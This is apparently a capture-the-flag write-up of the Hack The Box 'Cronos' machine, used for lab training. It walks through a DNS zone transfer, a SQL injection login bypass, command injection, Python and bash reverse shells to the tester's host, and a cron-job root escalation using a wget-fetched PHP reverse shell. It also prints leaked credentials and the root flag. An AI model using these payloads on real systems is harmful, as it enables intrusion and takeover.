I added the `host` to my `/etc/hosts` file as `cronos.htb` and started enumerating further.

From this I concluded nothing notable, I tried looking for subdomains but haven't found anything at all. 


## 53/TCP - DNS Zone Transfer

Since I've run out of options during my enumeration I decided to look at `port 53`. I decided to look up what my options were and found out about a technique called `DNS Zone Transfer` which is an attack that leverages `port 53` for it.

I found [an article](https://medium.com/@dw3113r/dns-zone-transfer-tutorial-subdomain-discovery-ba4eba534bff) that went into great depth which I used in order to progress:

![](../../../assets/2d785fbb9fc937fae6154ed635c24091.png)


==nslookup==
We can use a tool called `nslookup` in order to transfer our `DNS Zone`.

```bash
nslookup
server 10.10.10.13
10.10.10.13
```

![](../../../assets/186eaf43b93e49c77f4f859e7c8d3079.png)

This gave us a subdomain called `ns1.cronos.htb` which we can now add to our `/etc/hosts` file. 

![](../../../assets/6edcc29b92e2ee8a086e0b24703985c7.png)

Nothing interesting, let's look further.


==dig==
Now that the `zone transfer` is complete we can use `dig` to look up all other valuable information:

```bash
dig axfr cronos.htb @10.10.10.13
```

![](../../../assets/bedc08c572731cd34c199318bda47cf9.png)

We discovered another subdomain called `admin.cronos.htb` which I would guess is a login page, let's see. Yet again I add the domain to the `/etc/hosts` file:

```bash
10.10.10.13     cronos.htb ns1.cronos.htb admin.cronos.htb
```

I head to the `admin` subdomain:

![](../../../assets/9c3d136fee70c0113f777e72b62de688.png)

Indeed I find a login page.

## 80/TCP - HTTP

Apart from the login form, there is no mention of any framework serving the `login process`. I checked the `page source` and found nothing. 
Since I had nothing to work with I chose to list down common log in vulnerabilities. I could try `CSRF` or `Brute Forcing` but went ahead with `SQL Injection`. I tried to inject a bunch of payloads and in the end this one seemed to work:

![](../../../assets/c619a594d07ccdb565989ea52cff213c.png)

```
admin'-- -
admin
```

==Foothold==
We are finally rerouted to the website after successfully injecting our payload:

![](../../../assets/c8f1fc2e8d6296c676bf907ee7adaa4a.png)

Now we would like to find out what user we're logged in as. I checked the `page source` where I found what script it was executing:

![](../../../assets/ea8143b3089f4f68b553b61b2d5cf350.png)

It seems it's just issuing the `traceroute` or `ping -c 1` command with an argument input. Using that logic we can modify the payload to send malicious commands.

I ran a `command injection vulnerability` payload as follows:

![](../../../assets/a4a116661c6d2e522cb8f8502ae81e46.png)

We figured out that we're logged in as www-data. Now that we know `command injection` works we can insert other malicious commands:

![](../../../assets/f26ec48118864656e601dc2fac994306.png)

Now that we know what user is on the machine, we can go to his `/home` directory and `cat` the flag.


==user.txt==

## Privilege Escalation

==Reverse shell==
In order to further escalate privileges I chose to craft up a `python` reverse shell:

```bash
8.8.8.8; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

I started up a listener on my local machine:

```bash
nc -lvnp 1234
```

And I then issued the command and waited for the shell to return:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                    
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.13] 40360
www-data@cronos:/var/www/admin$ 
```

Great! I can now get to escalating privileges.
I proceed to `ls` the current directory and find a `config.php` file which I then `cat`:

```bash
www-data@cronos:/var/www/admin$ cat config.php  
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

Here I see a set of `admin` credentials for a `MySQL` database. But when I tried to connect using `mysql` it gave me an error:

```bash
┌──(kali㉿kali)-[~]
└─$ mysql -u admin -padmin -h 10.10.10.13       
ERROR 2002 (HY000): Can't connect to server on '10.10.10.13' (115)
```

This makes sense, since in our `nmap` scan we did not see any open ports running `MySQL`.


==crontab==
I realized that since the name of the box is `cronos` then it probably has something to do with [cron jobs](Linux%20Privilege%20Escalation.md#Cron%20Jobs#Writable%20Cron%20Job%20Scripts), so I figured to take a look at `/etc/crontabs`:

![](../../../assets/73ab3de487c0ad5297bd8686943b8e28.png)

Here we specifically see a `php` file running every minute under `root`. If we can get `write` access to it, that means we can modify the file as to give ourselves a `root` shell. Let's check:

```bash
cd /var/www/laravel

ls -l
```

```bash
-rwxr-xr-x  1 www-data www-data    1646 Apr  9  2017 artisan
```

It looks like we have write access to the file, thus we can change it to suffice our needs!


==Attempt 1 - FAIL==
I modify the file to this simple line:

```bash
nano artisan
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 &
```

And start a listener on port `4444`. Within one minute I should get a `root` shell in another terminal.

In theory it should've worked, but of course `nano` is not available on this machine thus we get an error:

```bash
www-data@cronos:/var/www/laravel$ nano artisan
nano artisan
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue


Error opening terminal: unknown.
```

I tried `cat >` as well but that didn't work either.


==Attempt 2 - Bash==

For the second attempt I used the following line to append the `basj -i` reverse shell script to the `artisan` file.

```bash
echo "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 &" >> artisan
```

I then used `cat` to check if the file was modified correctly:

```bash
www-data@cronos:/var/www/admin$ echo "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 &" >> artisan
<min$ echo "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 &" >> artisan           
www-data@cronos:/var/www/admin$ cat artisan
cat artisan
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 &
www-data@cronos:/var/www/admin$ 
```

Yet again it did not work.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                             
listening on [any] 4444 ...
```


==Attempt 3 - Python==
Remembering that the initial connection was also through python, we will now again try to append a `python reverse shell` to the `artisan` file using the following script:

```bash
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > artisan
```

![](../../../assets/48e93ca7f7dbab9647ac203d5abd2f43.png)

This yet again showed no results.


==Attempt 4 - wget==
As for this attempt I decided to instead set up a `python server` and `wget` a `php-reverse-shell` to the target. I will first download the `reverse shell` to the `/tmp` folder and then rename the file and move it to the correct directory.

```php
# Snippet of the reverse shell code

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.6';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

I start up a `python server`:

```bash
python3 -m http.server 8000
```

And on the target machine I move to `/tmp`:

```
cd /tmp
wget http://10.10.14.6:8000/php-rs.php
```

![](../../../assets/8fc4900cbf040286d534c4d9265189cf.png)

Now we can rename the file by using `mv` and moving the file to `/var/www/laravel/artisan`

```bash
mv php-rs.php /var/www/laravel/artisan
```

This attempt finally did work and it gave me a `reverse-shell as root`.

![](../../../assets/f2aec4e218079c2cfa0c508965e78fa9.png)


==root.txt==
```bash
cat /root/root.txt
038b52a1ae1b16f78cdf5989dce136d0
```
